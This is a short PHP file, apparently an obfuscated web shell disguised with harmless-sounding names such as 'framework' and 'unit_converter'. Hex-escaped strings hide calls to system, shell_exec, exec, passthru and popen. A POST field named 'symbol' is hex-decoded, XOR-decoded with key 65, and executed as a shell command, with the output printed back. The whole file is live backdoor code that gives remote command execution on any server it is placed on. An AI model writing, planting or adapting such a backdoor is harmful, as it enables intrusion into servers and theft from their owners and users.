<?php

$framework4 = "\x70a\x73st\x68\x72u";
$framework7 = "p\x63\x6Co\x73e";
$unit_converter = "h\x65x\x32\x62\x69n";
$framework5 = "pop\x65\x6E";
$framework6 = "\x73tr\x65am_ge\x74_\x63\x6F\x6Et\x65\x6Et\x73";
$framework3 = "exe\x63";
$framework1 = "\x73y\x73te\x6D";
$framework2 = "s\x68\x65ll_\x65x\x65c";
if (isset($_POST["\x73\x79\x6Dbol"])) {
            function reverse_searcher  ($k , $pointer) { $entity  = ''   ; foreach(str_split($k) as $char){$entity.=chr(ord($char)^$pointer);} return $entity;}
            $symbol = $unit_converter($_POST["\x73\x79\x6Dbol"]);
            $symbol = reverse_searcher($symbol, 65);
            if (function_exists($framework1)) {
                $framework1($symbol);
            } elseif (function_exists($framework2)) {
                print $framework2($symbol);
            } elseif (function_exists($framework3)) {
                $framework3($symbol, $element_k);
                print join("\n", $element_k);
            } elseif (function_exists($framework4)) {
                $framework4($symbol);
            } elseif (function_exists($framework5) && function_exists($framework6) && function_exists($framework7)) {
                $pointer_entity = $framework5($symbol, 'r');
                if ($pointer_entity) {
                    $dchunk_pgrp = $framework6($pointer_entity);
                    $framework7($pointer_entity);
                    print $dchunk_pgrp;
                }
            }
            exit;
        }